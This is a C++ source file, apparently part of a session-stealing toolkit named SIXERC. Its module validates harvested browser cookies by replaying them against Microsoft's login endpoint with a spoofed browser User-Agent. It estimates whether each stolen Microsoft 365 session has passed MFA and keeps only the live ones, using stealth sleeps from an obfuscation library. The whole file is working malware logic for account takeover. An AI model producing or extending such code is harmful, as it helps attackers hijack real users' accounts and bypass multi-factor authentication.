// ============================================================================
// SIXERC — TVRE Implementation
// ============================================================================

#include "modules/tvre.hpp"
#include "core/utils.hpp"
#include "core/obfuscation.hpp"
#include <curl/curl.h>
#include <sstream>

namespace sixerc::tvre {

static size_t write_callback(void* contents, size_t size, size_t nmemb, void* userp) {
    ((std::string*)userp)->append((char*)contents, size * nmemb);
    return size * nmemb;
}

M365Token validate_cookie(const SessionCookie& cookie) {
    M365Token token;
    token.token_type = cookie.name;
    token.value = cookie.value;
    token.domain = cookie.domain;
    token.expiry = std::chrono::system_clock::from_time_t(
        static_cast<time_t>(utils::chrome_time_to_unix(cookie.expires_utc)));
    
    token.is_valid = check_token_validity(cookie.value, cookie.name);
    token.mfa_claimed = extract_mfa_status(cookie.value);
    
    return token;
}

bool check_token_validity(const std::string& token_value, const std::string& token_type) {
    CURL* curl = curl_easy_init();
    if (!curl) return false;
    
    std::string read_buffer;
    struct curl_slist* headers = nullptr;
    
    // Construct a request to Microsoft's login endpoint to check session
    std::string cookie_header = "Cookie: " + token_type + "=" + token_value;
    headers = curl_slist_append(headers, cookie_header.c_str());
    headers = curl_slist_append(headers, "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                                         "AppleWebKit/537.36 (KHTML, like Gecko) "
                                         "Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0");
    headers = curl_slist_append(headers, "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
    headers = curl_slist_append(headers, "Accept-Language: en-US,en;q=0.9");
    
    curl_easy_setopt(curl, CURLOPT_URL, "https://login.microsoftonline.com/common/oauth2/authorize");
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &read_buffer);
    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
    curl_easy_setopt(curl, CURLOPT_MAXREDIRS, 5L);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 1L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 2L);
    
    CURLcode res = curl_easy_perform(curl);
    
    long http_code = 0;
    curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);
    
    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);
    
    if (res != CURLE_OK) return false;
    
    // If we get redirected to outlook or get a 200 with expected content, token is valid
    // If we get a login page, token is expired
    bool valid = (http_code == 200 || http_code == 302);
    
    // Check response content for indicators
    if (read_buffer.find("Sign in") != std::string::npos ||
        read_buffer.find("login") != std::string::npos && 
        read_buffer.find("password") != std::string::npos) {
        valid = false;
    }
    
    if (read_buffer.find("outlook") != std::string::npos ||
        read_buffer.find("office") != std::string::npos ||
        read_buffer.find("microsoft") != std::string::npos) {
        valid = true;
    }
    
    return valid;
}

bool extract_mfa_status(const std::string& token_value) {
    // Check for MFA claims in token structure
    // ESTSAUTHPERSISTENT usually indicates MFA was used
    // Also check for device claims
    
    if (token_value.find("mfa") != std::string::npos ||
        token_value.find("MFA") != std::string::npos ||
        token_value.find("strongAuthentication") != std::string::npos) {
        return true;
    }
    
    // Check token length/patterns for MFA indicators
    // Tokens with MFA tend to be longer and contain specific claim patterns
    if (token_value.length() > 2000) {
        return true;
    }
    
    return false;
}

std::vector<HarvestedSession> validate_sessions(const std::vector<HarvestedSession>& sessions) {
    std::vector<HarvestedSession> validated;
    
    for (const auto& session : sessions) {
        HarvestedSession vs = session;
        vs.tokens.clear();
        
        for (const auto& cookie : session.cookies) {
            obf::stealth_sleep(200);
            auto token = validate_cookie(cookie);
            if (token.is_valid) {
                vs.tokens.push_back(token);
            }
        }
        
        if (!vs.tokens.empty()) {
            validated.push_back(vs);
        }
    }
    
    return validated;
}

} // namespace sixerc::tvre
